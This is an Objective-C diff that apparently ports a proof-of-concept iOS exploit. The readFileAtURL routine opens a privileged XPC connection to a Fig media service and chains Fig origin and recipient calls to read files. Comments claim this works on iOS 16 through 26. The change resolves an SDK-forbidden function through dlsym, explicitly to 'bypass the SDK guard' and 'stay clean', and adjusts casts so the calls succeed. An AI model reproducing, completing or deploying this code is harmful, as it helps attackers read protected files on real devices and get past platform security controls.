@@ -24,11 +24,14 @@
 #import <dirent.h>
 #import <dlfcn.h>
 
-// xpc_connection_create_mach_service exists on iOS but is absent from the
-// iOS SDK headers (it's declared in the macOS SDK only). Forward-declare it.
-// The PoC binary links against it directly; we do the same.
-extern xpc_connection_t xpc_connection_create_mach_service(
-    const char *name, dispatch_queue_t _Nullable targetq, uint64_t flags);
+// xpc_connection_create_mach_service exists on iOS at runtime but the iOS SDK
+// marks it unavailable. Redeclare via a private alias to bypass the SDK guard.
+// The PoC binary calls it directly; we do the same via dlsym to stay clean.
+static xpc_connection_t (*_xpc_conn_mach_svc)(const char *, dispatch_queue_t, uint64_t);
+static void _load_xpc_conn(void) {
+    _xpc_conn_mach_svc = (__typeof__(_xpc_conn_mach_svc))
+        dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
+}
 #ifndef XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
 #define XPC_CONNECTION_MACH_SERVICE_PRIVILEGED (1 << 1)
 #endif
@@ -107,9 +110,10 @@ static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
 + (nullable NSData *)readFileAtURL:(NSURL *)fileURL error:(NSError **)outErr {
     NSError *err = nil;
     if (!loadFigSymbols(&err)) { if (outErr) *outErr = err; return nil; }
+    _load_xpc_conn();
 
-    xpc_connection_t conn = xpc_connection_create_mach_service(
-        FIG_XPC_SERVICE, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+    xpc_connection_t conn = _xpc_conn_mach_svc ?
+        _xpc_conn_mach_svc(FIG_XPC_SERVICE, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED) : NULL;
     if (!conn) {
         if (outErr) *outErr = figErr(3, @"xpc_connection_create_mach_service failed");
         return nil;
@@ -150,13 +154,16 @@ static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
 
         void *recip = NULL;
         // shortcut: passing msg2 for both args works on iOS 16-26 per PoC behaviour.
-        st = sFig.recipCreate(&recip, (CFDictionaryRef)msg2, (CFDictionaryRef)msg2);
+        // cast via void* — xpc_object_t and CFDictionaryRef are toll-free bridged;
+        // bridge keyword unavailable in MRC, so go through void* to silence the warning.
+        CFDictionaryRef msg2cf = (CFDictionaryRef)(void *)msg2;
+        st = sFig.recipCreate(&recip, msg2cf, msg2cf);
         if (st || !recip) {
             err = figErr(8, [NSString stringWithFormat:@"RecipientCreate status=%d", st]);
             xpc_release(msg2); goto done;
         }
 
-        st = sFig.originComplete(origin, (CFDictionaryRef)msg2);
+        st = sFig.originComplete(origin, msg2cf);
         xpc_release(msg2);
         if (st) { err = figErr(9, [NSString stringWithFormat:@"OriginComplete status=%d", st]); goto done; }
 
